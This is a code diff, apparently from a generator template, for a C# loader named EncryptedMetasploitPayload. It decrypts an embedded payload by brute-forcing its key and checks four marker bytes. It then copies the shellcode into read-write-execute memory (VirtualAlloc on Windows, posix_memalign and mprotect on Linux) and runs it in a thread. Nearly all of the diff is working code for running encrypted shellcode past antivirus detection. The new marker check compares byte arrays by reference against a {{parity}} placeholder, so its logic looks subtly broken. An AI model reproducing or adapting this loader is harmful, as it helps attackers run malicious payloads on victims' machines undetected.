@@ -35,19 +35,23 @@ namespace EncryptedMetasploitPayload
 						{{win86}}
 
 					foreach (byte[] code in payload) {
+						byte[] parity;
 						for (int i = 0; i <= 1024; i++) {
 							try {
 								byte[] uc = DecryptData (code, i.ToString());
-								IntPtr ptr = VirtualAlloc (IntPtr.Zero, (IntPtr)uc.Length, (IntPtr)0x1000, (IntPtr)0x40);
-								Marshal.Copy (uc, 0, ptr, uc.Length);
-								uc = null;
-								WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer (ptr, typeof(WindowsRun));
 
-								Thread thread = new Thread (new ThreadStart (() => {
-									r ();
-								}));
-								thread.Start ();
-								System.Threading.Thread.Sleep (500); 
+								if (new byte[] {uc[0],uc[1],uc[2],uc[3]} == {{parity}}) {
+									IntPtr ptr = VirtualAlloc (IntPtr.Zero, (IntPtr)(uc.Length-4), (IntPtr)0x1000, (IntPtr)0x40);
+									Marshal.Copy (uc, 4, ptr, uc.Length-4);
+									uc = null;
+									WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer (ptr, typeof(WindowsRun));
+
+									Thread thread = new Thread (new ThreadStart (() => {
+										r ();
+									}));
+									thread.Start ();
+									System.Threading.Thread.Sleep (500); 
+								}
 							}
 							catch 
 							{
@@ -69,30 +73,33 @@ namespace EncryptedMetasploitPayload
 						for (int i = 0; i <= 1024; i++) {
 							try {
 								byte[] uc = DecryptData (code, i.ToString ());
-								IntPtr length = (IntPtr)(uc.Length + pagesize - 1);
-								success = posix_memalign (ref ptr, (IntPtr)32, length);
 
-								if (success != IntPtr.Zero) 
-									return;
+								if (new byte[] {uc[0],uc[1],uc[2],uc[3]} == {{parity}}) {
+									IntPtr length = (IntPtr)((uc.Length-4) + pagesize - 1);
+									success = posix_memalign (ref ptr, (IntPtr)32, length);
 
-								IntPtr alignedPtr = (IntPtr)((int)ptr & ~(pagesize - 1)); //get page boundary
-								IntPtr mode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- careful of selinux
-								success = mprotect (alignedPtr, (IntPtr)32, mode);
+									if (success != IntPtr.Zero) 
+										return;
 
-								if (success != IntPtr.Zero) 
-									return;
+									IntPtr alignedPtr = (IntPtr)((int)ptr & ~(pagesize - 1)); //get page boundary
+									IntPtr mode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- careful of selinux
+									success = mprotect (alignedPtr, (IntPtr)32, mode);
 
-								Marshal.Copy (uc, 0, ptr, uc.Length);
-								uc = null;
-								LinuxRun r = (LinuxRun)Marshal.GetDelegateForFunctionPointer (ptr, typeof(LinuxRun));
+									if (success != IntPtr.Zero) 
+										return;
 
-								Thread thread = new Thread (new ThreadStart (() => {
-									r ();
-								}));
+									Marshal.Copy (uc, 4, ptr, uc.Length-4);
+									uc = null;
+									LinuxRun r = (LinuxRun)Marshal.GetDelegateForFunctionPointer (ptr, typeof(LinuxRun));
 
-								thread.Start ();
-								System.Threading.Thread.Sleep (500);
-								break;
+									Thread thread = new Thread (new ThreadStart (() => {
+										r ();
+									}));
+
+									thread.Start ();
+									System.Threading.Thread.Sleep (500);
+									break;
+								}
 							}
 							catch {
 							}
